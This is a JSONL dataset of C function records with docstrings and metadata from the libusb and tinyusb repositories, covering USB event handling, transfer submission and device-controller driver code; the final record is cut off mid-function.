{"docstring": "/** \\ingroup libusb_poll\n * Handle any pending events in blocking mode. There is currently a timeout\n * hard-coded at 60 seconds but we plan to make it unlimited in future. For\n * finer control over whether this function is blocking or non-blocking, or\n * for control over the timeout, use libusb_handle_events_timeout_completed()\n * instead.\n *\n * This function is kept primarily for backwards compatibility.\n * All new code should call libusb_handle_events_completed() or\n * libusb_handle_events_timeout_completed() to avoid race conditions.\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\returns 0 on success, or a LIBUSB_ERROR code on failure\n */\n", "func_signal": "int API_EXPORTED libusb_handle_events(libusb_context *ctx)", "code": "{\n\tstruct timeval tv;\n\ttv.tv_sec = 60;\n\ttv.tv_usec = 0;\n\treturn libusb_handle_events_timeout_completed(ctx, &tv, NULL);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Release the lock previously acquired with libusb_try_lock_events() or\n * libusb_lock_events(). Releasing this lock will wake up any threads blocked\n * on libusb_wait_for_event().\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\ref libusb_mtasync\n */\n", "func_signal": "void API_EXPORTED libusb_unlock_events(libusb_context *ctx)", "code": "{\n\tctx = usbi_get_context(ctx);\n\tctx->event_handler_active = 0;\n\tusbi_mutex_unlock(&ctx->events_lock);\n\n\t/* FIXME: perhaps we should be a bit more efficient by not broadcasting\n\t * the availability of the events lock when we are modifying pollfds\n\t * (check ctx->device_close)? */\n\tusbi_mutex_lock(&ctx->event_waiters_lock);\n\tusbi_cond_broadcast(&ctx->event_waiters_cond);\n\tusbi_mutex_unlock(&ctx->event_waiters_lock);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* returns the smallest of:\n *  1. timeout of next URB\n *  2. user-supplied timeout\n * returns 1 if there is an already-expired timeout, otherwise returns 0\n * and populates out\n */\n", "func_signal": "static int get_next_timeout(libusb_context *ctx, struct timeval *tv,\n\tstruct timeval *out)", "code": "{\n\tstruct timeval timeout;\n\tint r = libusb_get_next_timeout(ctx, &timeout);\n\tif (r) {\n\t\t/* timeout already expired? */\n\t\tif (!timerisset(&timeout))\n\t\t\treturn 1;\n\n\t\t/* choose the smallest of next URB timeout or user specified timeout */\n\t\tif (timercmp(&timeout, tv, <))\n\t\t\t*out = timeout;\n\t\telse\n\t\t\t*out = *tv;\n\t} else {\n\t\t*out = *tv;\n\t}\n\treturn 0;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* Add an event source to the list of event sources to be monitored.\n * poll_events should be specified as a bitmask of events passed to poll(), e.g.\n * POLLIN and/or POLLOUT. */\n", "func_signal": "int usbi_add_event_source(struct libusb_context *ctx, usbi_os_handle_t os_handle, short poll_events)", "code": "{\n\tstruct usbi_event_source *ievent_source = malloc(sizeof(*ievent_source));\n\n\tif (!ievent_source)\n\t\treturn LIBUSB_ERROR_NO_MEM;\n\n\tusbi_dbg(\"add \" USBI_OS_HANDLE_FORMAT_STRING \" events %d\", os_handle, poll_events);\n\tievent_source->data.os_handle = os_handle;\n\tievent_source->data.poll_events = poll_events;\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\tlist_add_tail(&ievent_source->list, &ctx->event_sources);\n\tusbi_event_source_notification(ctx);\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n\n#if !defined(PLATFORM_WINDOWS)\n\tif (ctx->fd_added_cb)\n\t\tctx->fd_added_cb(os_handle, poll_events, ctx->fd_cb_user_data);\n#endif\n\n\treturn 0;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* Similar to usbi_handle_transfer_completion() but exclusively for transfers\n * that were asynchronously cancelled. The same concerns w.r.t. freeing of\n * transfers exist here.\n * Do not call this function with the usbi_transfer lock held. User-specified\n * callback functions may attempt to directly resubmit the transfer, which\n * will attempt to take the lock. */\n", "func_signal": "int usbi_handle_transfer_cancellation(struct usbi_transfer *itransfer)", "code": "{\n\tstruct libusb_context *ctx = ITRANSFER_CTX(itransfer);\n\tuint8_t timed_out;\n\n\tusbi_mutex_lock(&ctx->flying_transfers_lock);\n\ttimed_out = itransfer->timeout_flags & USBI_TRANSFER_TIMED_OUT;\n\tusbi_mutex_unlock(&ctx->flying_transfers_lock);\n\n\t/* if the URB was cancelled due to timeout, report timeout to the user */\n\tif (timed_out) {\n\t\tusbi_dbg(\"detected timeout cancellation\");\n\t\treturn usbi_handle_transfer_completion(itransfer, LIBUSB_TRANSFER_TIMED_OUT);\n\t}\n\n\t/* otherwise its a normal async cancel */\n\treturn usbi_handle_transfer_completion(itransfer, LIBUSB_TRANSFER_CANCELLED);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Determine if an active thread is handling events (i.e. if anyone is holding\n * the event handling lock).\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\returns 1 if a thread is handling events\n * \\returns 0 if there are no threads currently handling events\n * \\ref libusb_mtasync\n */\n", "func_signal": "int API_EXPORTED libusb_event_handler_active(libusb_context *ctx)", "code": "{\n\tunsigned int r;\n\n\tctx = usbi_get_context(ctx);\n\n\t/* is someone else waiting to close a device? if so, don't let this thread\n\t * start event handling -- indicate that event handling is happening */\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\tr = ctx->device_close;\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n\tif (r) {\n\t\tusbi_dbg(\"someone else is closing a device\");\n\t\treturn 1;\n\t}\n\n\treturn ctx->event_handler_active;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* Add a completed transfer to the completed_transfers list of the\n * context and signal the event. The backend's handle_transfer_completion()\n * function will be called the next time an event handler runs. */\n", "func_signal": "void usbi_signal_transfer_completion(struct usbi_transfer *itransfer)", "code": "{\n\tlibusb_device_handle *dev_handle = USBI_TRANSFER_TO_LIBUSB_TRANSFER(itransfer)->dev_handle;\n\n\tif (dev_handle) {\n\t\tstruct libusb_context *ctx = HANDLE_CTX(dev_handle);\n\t\tunsigned int event_flags;\n\n\t\tusbi_mutex_lock(&ctx->event_data_lock);\n\t\tevent_flags = ctx->event_flags;\n\t\tctx->event_flags |= USBI_EVENT_TRANSFER_COMPLETED;\n\t\tlist_add_tail(&itransfer->completed_list, &ctx->completed_transfers);\n\t\tif (!event_flags)\n\t\t\tusbi_signal_event(&ctx->event);\n\t\tusbi_mutex_unlock(&ctx->event_data_lock);\n\t}\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* Handle completion of a transfer (completion might be an error condition).\n * This will invoke the user-supplied callback function, which may end up\n * freeing the transfer. Therefore you cannot use the transfer structure\n * after calling this function, and you should free all backend-specific\n * data before calling it.\n * Do not call this function with the usbi_transfer lock held. User-specified\n * callback functions may attempt to directly resubmit the transfer, which\n * will attempt to take the lock. */\n", "func_signal": "int usbi_handle_transfer_completion(struct usbi_transfer *itransfer,\n\tenum libusb_transfer_status status)", "code": "{\n\tstruct libusb_transfer *transfer =\n\t\tUSBI_TRANSFER_TO_LIBUSB_TRANSFER(itransfer);\n\tstruct libusb_device_handle *dev_handle = transfer->dev_handle;\n\tuint8_t flags;\n\tint r;\n\n\tr = remove_from_flying_list(itransfer);\n\tif (r < 0)\n\t\tusbi_err(ITRANSFER_CTX(itransfer), \"failed to set timer for next timeout\");\n\n\tusbi_mutex_lock(&itransfer->lock);\n\titransfer->state_flags &= ~USBI_TRANSFER_IN_FLIGHT;\n\tusbi_mutex_unlock(&itransfer->lock);\n\n\tif (status == LIBUSB_TRANSFER_COMPLETED\n\t\t\t&& transfer->flags & LIBUSB_TRANSFER_SHORT_NOT_OK) {\n\t\tint rqlen = transfer->length;\n\t\tif (transfer->type == LIBUSB_TRANSFER_TYPE_CONTROL)\n\t\t\trqlen -= LIBUSB_CONTROL_SETUP_SIZE;\n\t\tif (rqlen != itransfer->transferred) {\n\t\t\tusbi_dbg(\"interpreting short transfer as error\");\n\t\t\tstatus = LIBUSB_TRANSFER_ERROR;\n\t\t}\n\t}\n\n\tflags = transfer->flags;\n\ttransfer->status = status;\n\ttransfer->actual_length = itransfer->transferred;\n\tusbi_dbg(\"transfer %p has callback %p\", transfer, transfer->callback);\n\tif (transfer->callback)\n\t\ttransfer->callback(transfer);\n\t/* transfer might have been freed by the above call, do not use from\n\t * this point. */\n\tif (flags & LIBUSB_TRANSFER_FREE_TRANSFER)\n\t\tlibusb_free_transfer(transfer);\n\tlibusb_unref_device(dev_handle->dev);\n\treturn r;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/*\n * Interrupt the iteration of the event handling thread, so that it picks\n * up the event source change. Callers of this function must hold the event_data_lock.\n */\n", "func_signal": "static void usbi_event_source_notification(struct libusb_context *ctx)", "code": "{\n\tunsigned int event_flags;\n\n\t/* Record that there is a new poll fd.\n\t * Only signal an event if there are no prior pending events. */\n\tevent_flags = ctx->event_flags;\n\tctx->event_flags |= USBI_EVENT_EVENT_SOURCES_MODIFIED;\n\tif (!event_flags)\n\t\tusbi_signal_event(&ctx->event);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_asyncio\n * Set a transfers bulk stream id. Note users are advised to use\n * libusb_fill_bulk_stream_transfer() instead of calling this function\n * directly.\n *\n * Since version 1.0.19, \\ref LIBUSB_API_VERSION >= 0x01000103\n *\n * \\param transfer the transfer to set the stream id for\n * \\param stream_id the stream id to set\n * \\see libusb_alloc_streams()\n */\n", "func_signal": "void API_EXPORTED libusb_transfer_set_stream_id(\n\tstruct libusb_transfer *transfer, uint32_t stream_id)", "code": "{\n\tstruct usbi_transfer *itransfer =\n\t\tLIBUSB_TRANSFER_TO_USBI_TRANSFER(transfer);\n\n\titransfer->stream_id = stream_id;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Acquire the event waiters lock. This lock is designed to be obtained under\n * the situation where you want to be aware when events are completed, but\n * some other thread is event handling so calling libusb_handle_events() is not\n * allowed.\n *\n * You then obtain this lock, re-check that another thread is still handling\n * events, then call libusb_wait_for_event().\n *\n * You only need to use this lock if you are developing an application\n * which calls poll() or select() on libusb's file descriptors directly,\n * <b>and</b> may potentially be handling events from 2 threads simultaneously.\n * If you stick to libusb's event handling loop functions (e.g.\n * libusb_handle_events()) then you do not need to be concerned with this\n * locking.\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\ref libusb_mtasync\n */\n", "func_signal": "void API_EXPORTED libusb_lock_event_waiters(libusb_context *ctx)", "code": "{\n\tctx = usbi_get_context(ctx);\n\tusbi_mutex_lock(&ctx->event_waiters_lock);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Release the event waiters lock.\n * \\param ctx the context to operate on, or NULL for the default context\n * \\ref libusb_mtasync\n */\n", "func_signal": "void API_EXPORTED libusb_unlock_event_waiters(libusb_context *ctx)", "code": "{\n\tctx = usbi_get_context(ctx);\n\tusbi_mutex_unlock(&ctx->event_waiters_lock);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "// initialise libusb\n", "func_signal": "libusb_get_pollfds(ctx)\nwhile (user has not requested application exit)", "code": "{\n\tpoll(on libusb file descriptors plus any other event sources of interest,\n\t\tusing any timeout that you like)\n\tif (poll() indicated activity on libusb file descriptors)\n\t\tlibusb_handle_events_timeout(ctx, &zero_tv);\n\t// handle events from other sources here\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "// initialise libusb\n", "func_signal": "libusb_get_pollfds(ctx)\nwhile (user has not requested application exit)", "code": "{\n\tlibusb_get_next_timeout(ctx);\n\tpoll(on libusb file descriptors plus any other event sources of interest,\n\t\tusing a timeout no larger than the value libusb just suggested)\n\tif (poll() indicated activity on libusb file descriptors)\n\t\tlibusb_handle_events_timeout(ctx, &zero_tv);\n\tif (time has elapsed to or beyond the libusb timeout)\n\t\tlibusb_handle_events_timeout(ctx, &zero_tv);\n\t// handle events from other sources here\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Attempt to acquire the event handling lock. This lock is used to ensure that\n * only one thread is monitoring libusb event sources at any one time.\n *\n * You only need to use this lock if you are developing an application\n * which calls poll() or select() on libusb's file descriptors directly.\n * If you stick to libusb's event handling loop functions (e.g.\n * libusb_handle_events()) then you do not need to be concerned with this\n * locking.\n *\n * While holding this lock, you are trusted to actually be handling events.\n * If you are no longer handling events, you must call libusb_unlock_events()\n * as soon as possible.\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\returns 0 if the lock was obtained successfully\n * \\returns 1 if the lock was not obtained (i.e. another thread holds the lock)\n * \\ref libusb_mtasync\n */\n", "func_signal": "int API_EXPORTED libusb_try_lock_events(libusb_context *ctx)", "code": "{\n\tint r;\n\tunsigned int ru;\n\n\tctx = usbi_get_context(ctx);\n\n\t/* is someone else waiting to close a device? if so, don't let this thread\n\t * start event handling */\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\tru = ctx->device_close;\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n\tif (ru) {\n\t\tusbi_dbg(\"someone else is closing a device\");\n\t\treturn 1;\n\t}\n\n\tr = usbi_mutex_trylock(&ctx->events_lock);\n\tif (!r)\n\t\treturn 1;\n\n\tctx->event_handler_active = 1;\n\treturn 0;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/* remove a transfer from the active transfers list.\n * This function will *always* remove the transfer from the\n * flying_transfers list. It will return a LIBUSB_ERROR code\n * if it fails to update the timer for the next timeout. */\n", "func_signal": "static int remove_from_flying_list(struct usbi_transfer *itransfer)", "code": "{\n\tstruct libusb_context *ctx = ITRANSFER_CTX(itransfer);\n\tint rearm_timer;\n\tint r = 0;\n\n\tusbi_mutex_lock(&ctx->flying_transfers_lock);\n\trearm_timer = (TIMESPEC_IS_SET(&itransfer->timeout) &&\n\t\tlist_first_entry(&ctx->flying_transfers, struct usbi_transfer, list) == itransfer);\n\tlist_del(&itransfer->list);\n\tif (rearm_timer)\n\t\tr = arm_timer_for_next_timeout(ctx);\n\tusbi_mutex_unlock(&ctx->flying_transfers_lock);\n\n\treturn r;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Interrupt any active thread that is handling events. This is mainly useful\n * for interrupting a dedicated event handling thread when an application\n * wishes to call libusb_exit().\n *\n * Since version 1.0.21, \\ref LIBUSB_API_VERSION >= 0x01000105\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\ref libusb_mtasync\n */\n", "func_signal": "void API_EXPORTED libusb_interrupt_event_handler(libusb_context *ctx)", "code": "{\n\tunsigned int event_flags;\n\n\tusbi_dbg(\" \");\n\n\tctx = usbi_get_context(ctx);\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\n\tevent_flags = ctx->event_flags;\n\tctx->event_flags |= USBI_EVENT_USER_INTERRUPT;\n\tif (!event_flags)\n\t\tusbi_signal_event(&ctx->event);\n\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_poll\n * Retrieve a list of file descriptors that should be polled by your main loop\n * as libusb event sources.\n *\n * The returned list is NULL-terminated and should be freed with libusb_free_pollfds()\n * when done. The actual list contents must not be touched.\n *\n * As file descriptors are a Unix-specific concept, this function is not\n * available on Windows and will always return NULL.\n *\n * \\param ctx the context to operate on, or NULL for the default context\n * \\returns a NULL-terminated list of libusb_pollfd structures\n * \\returns NULL on error\n * \\returns NULL on platforms where the functionality is not available\n */\n", "func_signal": "DEFAULT_VISIBILITY\nconst struct libusb_pollfd ** LIBUSB_CALL libusb_get_pollfds(\n\tlibusb_context *ctx)", "code": "{\n#if !defined(PLATFORM_WINDOWS)\n\tstruct libusb_pollfd **ret = NULL;\n\tstruct usbi_event_source *ievent_source;\n\tsize_t i;\n\n\tstatic_assert(sizeof(struct usbi_event_source_data) == sizeof(struct libusb_pollfd),\n\t\t      \"mismatch between usbi_event_source_data and libusb_pollfd sizes\");\n\n\tctx = usbi_get_context(ctx);\n\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\n\ti = 0;\n\tfor_each_event_source(ctx, ievent_source)\n\t\ti++;\n\n\tret = calloc(i + 1, sizeof(struct libusb_pollfd *));\n\tif (!ret)\n\t\tgoto out;\n\n\ti = 0;\n\tfor_each_event_source(ctx, ievent_source)\n\t\tret[i++] = (struct libusb_pollfd *)ievent_source;\n\nout:\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n\treturn (const struct libusb_pollfd **)ret;\n#else\n\tusbi_err(ctx, \"external polling of libusb's internal event sources \" \\\n\t\t\"is not yet supported on Windows\");\n\treturn NULL;\n#endif\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "/** \\ingroup libusb_asyncio\n * Submit a transfer. This function will fire off the USB transfer and then\n * return immediately.\n *\n * \\param transfer the transfer to submit\n * \\returns 0 on success\n * \\returns LIBUSB_ERROR_NO_DEVICE if the device has been disconnected\n * \\returns LIBUSB_ERROR_BUSY if the transfer has already been submitted.\n * \\returns LIBUSB_ERROR_NOT_SUPPORTED if the transfer flags are not supported\n * by the operating system.\n * \\returns LIBUSB_ERROR_INVALID_PARAM if the transfer size is larger than\n * the operating system and/or hardware can support (see \\ref asynclimits)\n * \\returns another LIBUSB_ERROR code on other failure\n */\n", "func_signal": "int API_EXPORTED libusb_submit_transfer(struct libusb_transfer *transfer)", "code": "{\n\tstruct usbi_transfer *itransfer =\n\t\tLIBUSB_TRANSFER_TO_USBI_TRANSFER(transfer);\n\tstruct libusb_context *ctx = TRANSFER_CTX(transfer);\n\tint r;\n\n\tusbi_dbg(\"transfer %p\", transfer);\n\n\t/*\n\t * Important note on locking, this function takes / releases locks\n\t * in the following order:\n\t *  take flying_transfers_lock\n\t *  take itransfer->lock\n\t *  clear transfer\n\t *  add to flying_transfers list\n\t *  release flying_transfers_lock\n\t *  submit transfer\n\t *  release itransfer->lock\n\t *  if submit failed:\n\t *   take flying_transfers_lock\n\t *   remove from flying_transfers list\n\t *   release flying_transfers_lock\n\t *\n\t * Note that it takes locks in the order a-b and then releases them\n\t * in the same order a-b. This is somewhat unusual but not wrong,\n\t * release order is not important as long as *all* locks are released\n\t * before re-acquiring any locks.\n\t *\n\t * This means that the ordering of first releasing itransfer->lock\n\t * and then re-acquiring the flying_transfers_list on error is\n\t * important and must not be changed!\n\t *\n\t * This is done this way because when we take both locks we must always\n\t * take flying_transfers_lock first to avoid ab-ba style deadlocks with\n\t * the timeout handling and usbi_handle_disconnect paths.\n\t *\n\t * And we cannot release itransfer->lock before the submission is\n\t * complete otherwise timeout handling for transfers with short\n\t * timeouts may run before submission.\n\t */\n\tusbi_mutex_lock(&ctx->flying_transfers_lock);\n\tusbi_mutex_lock(&itransfer->lock);\n\tif (itransfer->state_flags & USBI_TRANSFER_IN_FLIGHT) {\n\t\tusbi_mutex_unlock(&ctx->flying_transfers_lock);\n\t\tusbi_mutex_unlock(&itransfer->lock);\n\t\treturn LIBUSB_ERROR_BUSY;\n\t}\n\titransfer->transferred = 0;\n\titransfer->state_flags = 0;\n\titransfer->timeout_flags = 0;\n\tr = add_to_flying_list(itransfer);\n\tif (r) {\n\t\tusbi_mutex_unlock(&ctx->flying_transfers_lock);\n\t\tusbi_mutex_unlock(&itransfer->lock);\n\t\treturn r;\n\t}\n\t/*\n\t * We must release the flying transfers lock here, because with\n\t * some backends the submit_transfer method is synchroneous.\n\t */\n\tusbi_mutex_unlock(&ctx->flying_transfers_lock);\n\n\tr = usbi_backend.submit_transfer(itransfer);\n\tif (r == LIBUSB_SUCCESS) {\n\t\titransfer->state_flags |= USBI_TRANSFER_IN_FLIGHT;\n\t\t/* keep a reference to this device */\n\t\tlibusb_ref_device(transfer->dev_handle->dev);\n\t}\n\tusbi_mutex_unlock(&itransfer->lock);\n\n\tif (r != LIBUSB_SUCCESS)\n\t\tremove_from_flying_list(itransfer);\n\n\treturn r;\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
{"docstring": "// handle control xfer (slave mode)\n", "func_signal": "static void control_xfer_isr(uint8_t rhport, uint32_t ep_int_status)", "code": "{\n  // Control out complete\n  if ( ep_int_status & TU_BIT(0) )\n  {\n    bool is_setup = sie_read(SIE_CMDCODE_ENDPOINT_SELECT+0) & SIE_SELECT_ENDPOINT_SETUP_RECEIVED_MASK;\n\n    LPC_USB->EpIntClr = TU_BIT(0);\n\n    if (is_setup)\n    {\n      uint8_t setup_packet[8];\n      control_ep_read(setup_packet, 8); // TODO read before clear setup above\n\n      dcd_event_setup_received(rhport, setup_packet, true);\n    }\n    else if ( _dcd.control.out_buffer )\n    {\n      // software queued transfer previously\n      uint8_t received = control_ep_read(_dcd.control.out_buffer, _dcd.control.out_bytes);\n\n      _dcd.control.out_buffer = NULL;\n      _dcd.control.out_bytes = 0;\n\n      dcd_event_xfer_complete(rhport, 0, received, XFER_RESULT_SUCCESS, true);\n    }else\n    {\n      // hardware auto ack packet -> mark as received\n      _dcd.control.out_received = true;\n    }\n  }\n\n  // Control In complete\n  if ( ep_int_status & TU_BIT(1) )\n  {\n    LPC_USB->EpIntClr = TU_BIT(1);\n    dcd_event_xfer_complete(rhport, TUSB_DIR_IN_MASK, _dcd.control.in_bytes, XFER_RESULT_SUCCESS, true);\n  }\n}", "path": "tinyusb/src/portable/nxp/lpc17_40/dcd_lpc17_40.c", "commit_date": "2020-08-01 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "//--------------------------------------------------------------------+\n// SIE Command\n//--------------------------------------------------------------------+\n", "func_signal": "static void sie_cmd_code (sie_cmdphase_t phase, uint8_t code_data)", "code": "{\n  LPC_USB->DevIntClr = (DEV_INT_COMMAND_CODE_EMPTY_MASK | DEV_INT_COMMAND_DATA_FULL_MASK);\n  LPC_USB->CmdCode   = (phase << 8) | (code_data << 16);\n\n  uint32_t const wait_flag = (phase == SIE_CMDPHASE_READ) ? DEV_INT_COMMAND_DATA_FULL_MASK : DEV_INT_COMMAND_CODE_EMPTY_MASK;\n  while ((LPC_USB->DevIntSt & wait_flag) == 0) {}\n\n  LPC_USB->DevIntClr = wait_flag;\n}", "path": "tinyusb/src/portable/nxp/lpc17_40/dcd_lpc17_40.c", "commit_date": "2020-08-01 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "//--------------------------------------------------------------------+\n// CONTROLLER API\n//--------------------------------------------------------------------+\n", "func_signal": "static void bus_reset(void)", "code": "{\n  // step 7 : slave mode set up\n  LPC_USB->EpIntClr     = 0xFFFFFFFF; // clear all pending interrupt\n  LPC_USB->DevIntClr    = 0xFFFFFFFF; // clear all pending interrupt\n  LPC_USB->EpIntEn      = 0x03UL;     // control endpoint cannot use DMA, non-control all use DMA\n  LPC_USB->EpIntPri     = 0x03UL;     // fast for control endpoint\n\n  // step 8 : DMA set up\n  LPC_USB->EpDMADis     = 0xFFFFFFFF; // firstly disable all dma\n  LPC_USB->DMARClr      = 0xFFFFFFFF; // clear all pending interrupt\n  LPC_USB->EoTIntClr    = 0xFFFFFFFF;\n  LPC_USB->NDDRIntClr   = 0xFFFFFFFF;\n  LPC_USB->SysErrIntClr = 0xFFFFFFFF;\n\n  tu_memclr(&_dcd, sizeof(dcd_data_t));\n}", "path": "tinyusb/src/portable/nxp/lpc17_40/dcd_lpc17_40.c", "commit_date": "2020-08-01 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when usb bus is suspended\n// remote_wakeup_en : if host allow us  to perform remote wakeup\n// Within 7ms, device must draw an average of current less than 2.5 mA from bus\n", "func_signal": "void tud_suspend_cb(bool remote_wakeup_en)", "code": "{\n  (void)remote_wakeup_en;\n  blink_interval_ms = BLINK_SUSPENDED;\n}", "path": "tinyusb/examples/device/uac2_headset/src/main.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when received GET STRING DESCRIPTOR request\n// Application return pointer to descriptor, whose contents must exist long enough for transfer to complete\n", "func_signal": "uint16_t const* tud_descriptor_string_cb(uint8_t index, uint16_t langid)", "code": "{\n  (void) langid;\n\n  uint8_t chr_count;\n\n  if ( index == 0)\n  {\n    memcpy(&_desc_str[1], string_desc_arr[0], 2);\n    chr_count = 1;\n  }else\n  {\n    // Note: the 0xEE index string is a Microsoft OS 1.0 Descriptors.\n    // https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/microsoft-defined-usb-descriptors\n\n    if ( !(index < sizeof(string_desc_arr)/sizeof(string_desc_arr[0])) ) return NULL;\n\n    const char* str = string_desc_arr[index];\n\n    // Cap at max char\n    chr_count = strlen(str);\n    if ( chr_count > 31 ) chr_count = 31;\n\n    // Convert ASCII string into UTF-16\n    for(uint8_t i=0; i<chr_count; i++)\n    {\n      _desc_str[1+i] = str[i];\n    }\n  }\n\n  // first byte is length (including header), second byte is string type\n  _desc_str[0] = (TUSB_DESC_STRING << 8 ) | (2*chr_count + 2);\n\n  return _desc_str;\n}", "path": "tinyusb/examples/device/hid_composite_freertos/src/usb_descriptors.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Invoked when received GET CONFIGURATION DESCRIPTOR\n// Application return pointer to descriptor\n// Descriptor contents must exist long enough for transfer to complete\n", "func_signal": "uint8_t const * tud_descriptor_configuration_cb(uint8_t index)", "code": "{\n  (void) index; // for multiple configurations\n  return desc_configuration;\n}", "path": "tinyusb/examples/device/hid_composite_freertos/src/usb_descriptors.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "hathach/tinyusb", "stars": 4415, "license": "mit", "language": "c", "size": 39572}
{"docstring": "// Helper for feature unit get requests\n", "func_signal": "static bool tud_audio_feature_unit_get_request(uint8_t rhport, audio_control_request_t const *request)", "code": "{\n  TU_ASSERT(request->bEntityID == UAC2_ENTITY_SPK_FEATURE_UNIT);\n\n  if (request->bControlSelector == AUDIO_FU_CTRL_MUTE && request->bRequest == AUDIO_CS_REQ_CUR)\n  {\n    audio_control_cur_1_t mute1 = { .bCur = mute[request->bChannelNumber] };\n    TU_LOG2(\"Get channel %u mute %d\\r\\n\", request->bChannelNumber, mute1.bCur);\n    return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &mute1, sizeof(mute1));\n  }\n  else if (UAC2_ENTITY_SPK_FEATURE_UNIT && request->bControlSelector == AUDIO_FU_CTRL_VOLUME)\n  {\n    if (request->bRequest == AUDIO_CS_REQ_RANGE)\n    {\n      audio_control_range_2_n_t(1) range_vol = {\n        .wNumSubRanges = tu_htole16(1),\n        .subrange[0] = { .bMin = tu_htole16(-VOLUME_CTRL_50_DB), tu_htole16(VOLUME_CTRL_0_DB), tu_htole16(256) }\n      };\n      TU_LOG2(\"Get channel %u volume range (%d, %d, %u) dB\\r\\n\", request->bChannelNumber,\n              range_vol.subrange[0].bMin / 256, range_vol.subrange[0].bMax / 256, range_vol.subrange[0].bRes / 256);\n      return tud_audio_buffer_and_schedule_control_xfer(rhport, (tusb_control_request_t const *)request, &range_vol, sizeof(range_vol));\n  